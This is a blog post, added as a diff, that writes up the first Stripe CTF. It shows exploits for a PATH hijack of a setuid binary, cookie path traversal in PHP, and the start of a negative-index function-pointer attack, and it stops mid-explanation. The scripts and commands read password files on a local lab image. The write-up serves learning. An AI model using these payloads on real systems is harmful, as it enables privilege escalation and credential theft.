@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>The First Stripe CTF</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="bt3">
+
+    <!-- Le styles -->
+    <link rel="stylesheet" href="http://bt3gl.github.io/theme/css/bootstrap.dark.css" type="text/css" />
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+      .sidebar-nav {
+        padding: 9px 0;
+      }
+      .tag-1 {
+        font-size: 13pt;
+      }
+      .tag-2 {
+        font-size: 11pt;
+      }
+      .tag-2 {
+        font-size: 10pt;
+      }
+      .tag-4 {
+        font-size: 8pt;
+     }
+    </style>
+    <link href="http://bt3gl.github.io/theme/css/bootstrap-responsive.dark.css" rel="stylesheet">
+        <link href="http://bt3gl.github.io/theme/css/font-awesome.css" rel="stylesheet">
+
+    <link href="http://bt3gl.github.io/theme/css/pygments.css" rel="stylesheet">
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le fav and touch icons -->
+    <link rel="shortcut icon" href="http://bt3gl.github.io/theme/images/favicon.ico">
+    <link rel="apple-touch-icon" href="http://bt3gl.github.io/theme/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="http://bt3gl.github.io/theme/images/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="http://bt3gl.github.io/theme/images/apple-touch-icon-114x114.png">
+
+    <link href="http://bt3gl.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Higher Bytes by bt3 ATOM Feed" />
+
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="http://bt3gl.github.io/index.html">Higher Bytes by bt3 </a>
+          <div class="nav-collapse">
+            <ul class="nav">
+                          <li class="divider-vertical"></li>
+
+
+                          <ul class="nav pull-right">
+                                <li><a href="http://bt3gl.github.io/authors.html">About</a></li>
+                                <li><a href="https://github.com/bt3gl">GitHub</a></li>
+                                <li><a href="https://twitter.com/_b_t_3_">Twitter</a></li>
+                                <li><a href="https://coderwall.com/p/kubxjq?i=11&p=2&q=author%3Abt3gl&t%5B%5D=bt3gl">CodeWall</a></li>
+                                <li><a href="projects_page/index.html">Projects</a></li>
+                                <li><a href="http://bt3gl.github.io/archives.html"><b>Archives</b></a></li>
+
+                          </ul>
+
+            </ul>
+            <!--<p class="navbar-text pull-right">Logged in as <a href="#">username</a></p>-->
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="span9" id="content">
+<section id="content">
+        <article>
+                <header>
+                        <h1>
+                                <a href=""
+                                        rel="bookmark"
+                                        title="Permalink to The First Stripe CTF">
+                                        The First Stripe CTF
+                                </a>
+                        </h1>
+                </header>
+                <div class="entry-content">
+                <div class="well">
+<footer class="post-info">
+<abbr class="published" title="2014-11-24T04:20:00">
+      Mon 24 November 2014 </abbr>
+
+<span class="label"> Category</span>
+<a href="http://bt3gl.github.io/category/vulnerabilities.html"><i class="icon-folder-open"></i>Vulnerabilities</a>
+
+
+<span class="label">Tags</span>
+	<a href="http://bt3gl.github.io/tag/sqli.html"><i class="icon-tag"></i>SQLi</a>
+	<a href="http://bt3gl.github.io/tag/php.html"><i class="icon-tag"></i>PHP</a>
+	<a href="http://bt3gl.github.io/tag/wargames.html"><i class="icon-tag"></i>Wargames</a>
+	<a href="http://bt3gl.github.io/tag/ctf.html"><i class="icon-tag"></i>CTF</a>
+	<a href="http://bt3gl.github.io/tag/burp.html"><i class="icon-tag"></i>Burp</a>
+	<a href="http://bt3gl.github.io/tag/curl.html"><i class="icon-tag"></i>curl</a>
+	<a href="http://bt3gl.github.io/tag/assembly.html"><i class="icon-tag"></i>assembly</a>
+	<a href="http://bt3gl.github.io/tag/shellcode.html"><i class="icon-tag"></i>shellcode</a>
+	<a href="http://bt3gl.github.io/tag/gdb.html"><i class="icon-tag"></i>gdb</a>
+	<a href="http://bt3gl.github.io/tag/c.html"><i class="icon-tag"></i>C</a>
+	<a href="http://bt3gl.github.io/tag/objdump.html"><i class="icon-tag"></i>objdump</a>
+	<a href="http://bt3gl.github.io/tag/timing_attack.html"><i class="icon-tag"></i>Timing_attack</a>
+	<a href="http://bt3gl.github.io/tag/buffer_overflow.html"><i class="icon-tag"></i>Buffer_overflow</a>
+	<a href="http://bt3gl.github.io/tag/stack_overflow.html"><i class="icon-tag"></i>Stack_overflow</a>
+</footer><!-- /.post-info -->                </div>
+                <div class="highlight"><pre>    <span class="n">Although</span> <span class="n">I</span> <span class="n">did</span> <span class="n">not</span> <span class="n">have</span> <span class="n">the</span> <span class="n">chance</span> <span class="n">of</span> <span class="n">playing</span> <span class="n">neither</span> <span class="n">of</span> <span class="n">the</span> <span class="n">three</span> <span class="n">Stripe</span> <span class="n">CTFs</span><span class="p">,</span> <span class="n">I</span> <span class="n">was</span> <span class="n">quite</span> <span class="n">amused</span> <span class="n">when</span> <span class="n">I</span> <span class="n">looked</span> <span class="n">to</span> <span class="n">the</span> <span class="n">problems</span><span class="p">.</span> <span class="n">I</span> <span class="n">decided</span> <span class="n">to</span> <span class="n">solved</span> <span class="n">them</span> <span class="n">anyway</span> <span class="n">and</span> <span class="n">I</span> <span class="n">am</span> <span class="n">writing</span> <span class="n">this</span> <span class="n">series</span> <span class="n">of</span> <span class="n">writeups</span><span class="p">.</span>
+</pre></div>
+
+
+<p>This first post is about the first Stripe CTF, which happened in the beginning of 2012. I was able to fully reproduce the game by using a <a href="http://www.janosgyerik.com/hacking-contest-on-a-live-cd/">Live CD Image</a>. Other options were <a href="https://stripe.com/blog/capture-the-flag-wrap-up">direct download and BitTorrent</a>.</p>
+<p>This CTF was composed of 6 levels, and its style was very similar to other Wargames I've talked about in this blog (for instance, check <a href="http://overthewire.org/wargames/">OverTheWire's</a> <a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html">Natas</a>, <a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html">Narnia</a>, and <a href="http://bt3gl.github.io/cryptography-war-beating-krypton.html">Krypton</a>).</p>
+<hr />
+<h2>Level 1: Environment Variables and system()</h2>
+<p>When I boot the image  I get this first message:</p>
+<p><img alt="" src="http://i.imgur.com/O9ixhUv.jpg" /></p>
+<p>In the  <em>level01</em> folder I find:</p>
+<ul>
+<li>
+<p>A <a href="http://linux.die.net/man/2/setuid">setuid</a> binary (a binary with access right flags that allow users to run executables with permissions of the owner or group).</p>
+</li>
+<li>
+<p>The C source code of this binary:</p>
+</li>
+</ul>
+<p><img alt="" src="http://i.imgur.com/DgB55I8.jpg" /></p>
+<p>Checking the code closely we notice the following lines:</p>
+<div class="highlight"><pre>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Current time: &quot;</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">&quot;date&quot;</span><span class="p">);</span>
+</pre></div>
+
+
+<p>The vulnerability becomes quite obvious!</p>
+<p>First, if you use <code>printf</code> to send text without a trailing <code>\n</code> to <strong>stdout</strong> (the screen), there is no guarantee that any of the text will appear, so <a href="http://man7.org/linux/man-pages/man3/fflush.3.html">fflush</a> is used to write everything that is buffered  to <strong>stdout</strong>.</p>
+<p>Second, <code>system()</code> executes <a href="http://linux.die.net/man/3/system">any shell command you pass to it</a>. In the case above, it will find a command through the <a href="http://en.wikipedia.org/wiki/PATH_%28variable%29">PATH environment variable</a>.</p>
+<p>It's clear that if we manage to change the variable <code>date</code> to some controlled exploit (such as <code>cat /home/level01/.password</code>) we  get the password printed.</p>
+<p>The second ingredient is the fact that <code>system()</code> outputs the date using <strong>relative paths</strong> <a href="http://en.wikipedia.org/wiki/Environment_variable">by the environment variables</a> PATH).  So, we just need to change it to the directory where we keep our exploit (<code>pwd</code>) to have the system <em>forgetting</em> about the original date function.</p>
+<p>The final script that leads to the next level's password looks like this:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="highlight"><pre><span class="c">#!/bin/sh</span>
+<span class="nb">cd</span> /tmp
+<span class="nb">echo</span> <span class="s1">&#39;/bin/cat /home/level01/.password &gt; date&#39;</span>
+chmod +x date
+<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:<span class="nv">$PATH</span>
+/levels/level01/level01
+</pre></div>
+</td></tr></table>
+
+<hr />
+<h2>Level 2: Client's Cookies</h2>
+<p>This level's goal is about finding a vulnerability in a PHP script  that has a greeting functionality.</p>
+<p>By setting a cookie with a file path in it, it saves the user's username and age so in future visits to the page, it will print  <em>You’re NAME, and your age is AGE</em>:</p>
+<div class="highlight"><pre><span class="cp">&lt;?php</span>
+    <span class="k">function</span> <span class="nf">random_string</span><span class="p">(</span><span class="nv">$max</span> <span class="o">=</span> <span class="mi">20</span><span class="p">){</span>
+        <span class="nv">$chars</span> <span class="o">=</span> <span class="s2">&quot;abcdefghijklmnopqrstuvwxwz0123456789&quot;</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$max</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+            <span class="nv">$rand_key</span> <span class="o">=</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">));</span>
+            <span class="nv">$string</span>  <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$chars</span><span class="p">,</span> <span class="nv">$rand_key</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nb">str_shuffle</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user_details&#39;</span><span class="p">]))</span> <span class="p">{</span>
+      <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;&lt;p&gt;Looks like a first time user. Hello, there!&lt;/p&gt;&quot;</span><span class="p">;</span>
+      <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">random_string</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.txt&quot;</span><span class="p">;</span>
+      <span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;/tmp/level02/&#39;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
+      <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; using &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
+      <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
+      <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+      <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;user_details&#39;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="nv">$out</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/tmp/level02/&#39;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user_details&#39;</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">&lt;html&gt;</span>
+<span class="x">  &lt;head&gt;</span>
+<span class="x">    &lt;title&gt;Level02&lt;/title&gt;</span>
+<span class="x">  &lt;/head&gt;</span>
+<span class="x">  &lt;body&gt;</span>
+<span class="x">    &lt;h1&gt;Welcome to the challenge!&lt;/h1&gt;</span>
+<span class="x">    &lt;div class=&quot;main&quot;&gt;</span>
+<span class="x">      &lt;p&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$out</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
+<span class="x">      </span><span class="cp">&lt;?php</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]))</span> <span class="p">{</span>
+          <span class="k">echo</span> <span class="s2">&quot;You&#39;re &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;, and your age is &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+      <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">      &lt;form action=&quot;#&quot; method=&quot;post&quot;&gt;</span>
+<span class="x">        Name: &lt;input name=&quot;name&quot; type=&quot;text&quot; length=&quot;40&quot; /&gt;&lt;br /&gt;</span>
+<span class="x">        Age: &lt;input name=&quot;age&quot; type=&quot;text&quot; length=&quot;2&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span>
+<span class="x">        &lt;input type=&quot;submit&quot; value=&quot;Submit!&quot; /&gt;</span>
+<span class="x">      &lt;/form&gt;</span>
+<span class="x">      </span><span class="cp">&lt;?php</span>   <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">  &lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+</pre></div>
+
+
+<p>Inspecting the code closer we see that it uses the contents of the client's cookie to read data from a file without escaping the contents:</p>
+<div class="highlight"><pre><span class="cp">&lt;?php</span>
+    <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user_details&#39;</span><span class="p">]))</span> <span class="p">{</span>
+      <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;user_details&#39;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="nv">$out</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/tmp/level02/&#39;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user_details&#39;</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+
+<p>And then it prints the result:</p>
+<div class="highlight"><pre><span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;p&gt;</span><span class="cp">&lt;?php echo $out ?&gt;</span><span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></div>
+
+
+<p>We can exploit this by building our own <a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html">request</a> so that we make the above script to read our password at <em>/home/level02/.password</em>.</p>
+<p>The cookie is set in the client side so we have lots of freedom to exploit it. For instance, we could use <a href="http://portswigger.net/burp/">Burp Suite</a> to intercept the quest and add the crafted cookie header. We could also use <a href="https://chrome.google.com/webstore/detail/web-inspector/enibedkmbpadhfofcgjcphipflcbpelf?hl=en">Chrome Webinspector</a> to  copy the <a href="http://en.wikipedia.org/wiki/Basic_access_authentication">Authorization header</a> for the same purpose.</p>
+<p>The Cookie header would look like:</p>
+<div class="highlight"><pre><span class="n">Cookie</span><span class="o">:</span> <span class="n">user_details</span><span class="o">=../../</span><span class="n">home</span><span class="sr">/level02/</span><span class="o">.</span><span class="na">password</span>
+</pre></div>
+
+
+<p>Interestingly, it is also possible to solve this problem with one instruction in the command line:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">curl</span>  <span class="o">--</span><span class="n">user</span> <span class="n">level01</span><span class="o">:</span><span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">level01</span><span class="o">/</span><span class="p">.</span><span class="n">password</span><span class="p">)</span> <span class="o">--</span><span class="n">digest</span> <span class="o">-</span><span class="n">b</span> <span class="s">&quot;user_details=../../home/level02/.password&quot;</span> <span class="n">localhost</span><span class="o">:</span><span class="mi">8002</span><span class="o">/</span><span class="n">level02</span><span class="p">.</span><span class="n">php</span>
+</pre></div>
+
+
+<p>Where the flag <strong>--digest</strong> enables HTTP authentication, and the flag <strong>-b</strong> or <strong>-cookie</strong> lets us point it a cookie.</p>
+<p>In the LiveCD this level is modified to use Python and Flask. Luckly, I had some previous playing in Flask (check out my <a href="">anti-social network</a>) and it was pretty easy to spot that the Pyhton code does <em>exactly</em> the same thing as the one above.</p>
+<hr />
+<h2>Level 3: Failure in Input Validation</h2>
+<p>The third level comes with another <em>setuid</em> binary that is used to modify  strings:</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="o">/</span><span class="n">levels</span><span class="o">/</span><span class="n">level03</span>
+    <span class="nl">Usage:</span> <span class="p">.</span><span class="o">/</span><span class="n">level03</span> <span class="n">INDEX</span> <span class="n">STRING</span>
+    <span class="n">Possible</span> <span class="n">indices</span><span class="o">:</span>
+    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="n">to_upper</span>    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">to_lower</span>
+    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">capitalize</span>  <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">length</span>
+</pre></div>
+
+
+<p>and with  this  C code:</p>
+<div class="highlight"><pre><span class="err">#</span><span class="nx">define</span> <span class="nx">NUM_FNS</span> <span class="mi">4</span>
+
+<span class="nx">typedef</span> <span class="kr">int</span> <span class="p">(</span><span class="o">*</span><span class="nx">fn_ptr</span><span class="p">)(</span><span class="kr">const</span> <span class="kr">char</span> <span class="o">*</span><span class="p">);</span>
+
+<span class="kr">int</span> <span class="nx">to_upper</span><span class="p">(</span><span class="kr">const</span> <span class="kr">char</span> <span class="o">*</span><span class="nx">str</span><span class="p">)</span>
+<span class="p">{(...)}</span>
+
+<span class="kr">int</span> <span class="nx">to_lower</span><span class="p">(</span><span class="kr">const</span> <span class="kr">char</span> <span class="o">*</span><span class="nx">str</span><span class="p">)</span>
+<span class="p">{(...)}</span>
+
+<span class="kr">int</span> <span class="nx">capitalize</span><span class="p">(</span><span class="kr">const</span> <span class="kr">char</span> <span class="o">*</span><span class="nx">str</span><span class="p">)</span>
+<span class="p">{(...)}</span>
+
+<span class="kr">int</span> <span class="nx">length</span><span class="p">(</span><span class="kr">const</span> <span class="kr">char</span> <span class="o">*</span><span class="nx">str</span><span class="p">)</span>
+<span class="p">{(...)}</span>
+
+<span class="kr">int</span> <span class="nx">run</span><span class="p">(</span><span class="kr">const</span> <span class="kr">char</span> <span class="o">*</span><span class="nx">str</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="c1">// This function is now deprecated.</span>
+  <span class="k">return</span> <span class="nx">system</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kr">int</span> <span class="nx">truncate_and_call</span><span class="p">(</span><span class="nx">fn_ptr</span> <span class="o">*</span><span class="nx">fns</span><span class="p">,</span> <span class="kr">int</span> <span class="nx">index</span><span class="p">,</span> <span class="kr">char</span> <span class="o">*</span><span class="nx">user_string</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kr">char</span> <span class="nx">buf</span><span class="cp">[</span><span class="mi">64</span><span class="cp">]</span><span class="p">;</span>
+  <span class="c1">// Truncate supplied string</span>
+  <span class="nx">strncpy</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">user_string</span><span class="p">,</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="nx">buf</span><span class="cp">[</span><span class="nx">sizeof</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="cp">]</span> <span class="o">=</span> <span class="s1">&#39;\0&#39;</span><span class="p">;</span>
+  <span class="k">return</span> <span class="nx">fns</span><span class="cp">[</span><span class="nb">index</span><span class="cp">]</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kr">int</span> <span class="nx">main</span><span class="p">(</span><span class="kr">int</span> <span class="nx">argc</span><span class="p">,</span> <span class="kr">char</span> <span class="o">**</span><span class="nx">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kr">int</span> <span class="nx">index</span><span class="p">;</span>
+  <span class="nx">fn_ptr</span> <span class="nx">fns</span><span class="cp">[</span><span class="nx">NUM_FNS</span><span class="cp">]</span> <span class="o">=</span> <span class="p">{</span><span class="o">&amp;</span><span class="nx">to_upper</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">to_lower</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">capitalize</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">length</span><span class="p">};</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;Usage: ./level03 INDEX STRING\n&quot;</span><span class="p">);</span>
+    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;Possible indices:\n</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span><span class="s2"> to_upper\t</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="s2"> to_lower\n&quot;</span><span class="p">);</span>
+    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="s2"> capitalize\t</span><span class="cp">[</span><span class="mi">3</span><span class="cp">]</span><span class="s2"> length\n&quot;</span><span class="p">);</span>
+    <span class="nx">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Parse supplied index</span>
+  <span class="nx">index</span> <span class="o">=</span> <span class="nx">atoi</span><span class="p">(</span><span class="nx">argv</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">index</span> <span class="o">&gt;=</span> <span class="nx">NUM_FNS</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;Invalid index.\n&quot;</span><span class="p">);</span>
+    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;Possible indices:\n</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span><span class="s2"> to_upper\t</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="s2"> to_lower\n&quot;</span><span class="p">);</span>
+    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="s2"> capitalize\t</span><span class="cp">[</span><span class="mi">3</span><span class="cp">]</span><span class="s2"> length\n&quot;</span><span class="p">);</span>
+    <span class="nx">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="nx">truncate_and_call</span><span class="p">(</span><span class="nx">fns</span><span class="p">,</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">argv</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>In problems like this, the attack surface is usually any place where there is input from the user. For this  reason, our approach is to take a look at the arguments taken in main, checking for the common memory and overflow vulnerabilities  in C.</p>
+<p>We find a vulnerability in the failure of checking for negative inputs:</p>
+<div class="highlight"><pre><span class="cp">#define NUM_FNS 4</span>
+<span class="p">(...)</span>
+  <span class="c1">// Parse supplied index</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;=</span> <span class="n">NUM_FNS</span><span class="p">)</span> <span class="p">{</span>
+     <span class="p">(...)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>Then this <strong>index</strong> variable is used in the function <strong>truncate_and_call</strong>, where  the function <strong>fns</strong>:</p>
+<div class="highlight"><pre><span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fn_ptr</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
+<span class="p">(...)</span>
+<span class="n">fn_ptr</span> <span class="n">fns</span><span class="p">[</span><span class="n">NUM_FNS</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="o">&amp;</span><span class="n">to_upper</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">to_lower</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">capitalize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">};</span>
+</pre></div>
+
+
+<p>can be overflowed:</p>
+<div class="highlight"><pre><span class="kt">int</span> <span class="nf">truncate_and_call</span><span class="p">(</span><span class="n">fn_ptr</span> <span class="o">*</span><span class="n">fns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">index</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">user_string</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  <span class="c1">// Truncate supplied string</span>
+  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">user_string</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">fns</span><span class="p">[</span><span class="n">index</span><span class="p">](</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>Things became more clear when we notice that right before <strong>truncate_and_call</strong> we have this convenient function:</p>
+<div class="highlight"><pre><span class="kt">int</span> <span class="nf">run</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<h3>Description of the Exploit</h3>
+<p>1)  To understand this problem we need to understand the <a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html">design of the stack frame</a>.  In our exploit we  craft a malicious index that is negative (so it pass the bound checking) to  have a shell running <code>system("/bin/sh");</code> (which will be able to read password o level3 because it will have this UID).</p>
+<p>2) The first thing to do is find a memory location before <strong>fns</strong> (which should be writable). For this task we fire up <strong>gdb</strong> and search for the pointer to <strong>buf</strong>, which is right before <strong>fns</strong> (this is different each time due to <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>):</p>
+<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span>  <span class="o">&amp;</span><span class="n">buf</span>
+    <span class="p">(</span><span class="kt">char</span> <span class="p">(</span><span class="o">*</span><span class="p">)[</span><span class="mi">64</span><span class="p">])</span> <span class="mh">0xffbffa00</span>
+</pre></div>
+
+
+<p>3) We  check <strong>index</strong> (where 4 is sizeof(*fns)), and subtract <strong>buf</strong> from to the pointer to <strong>fns</strong>:</p>
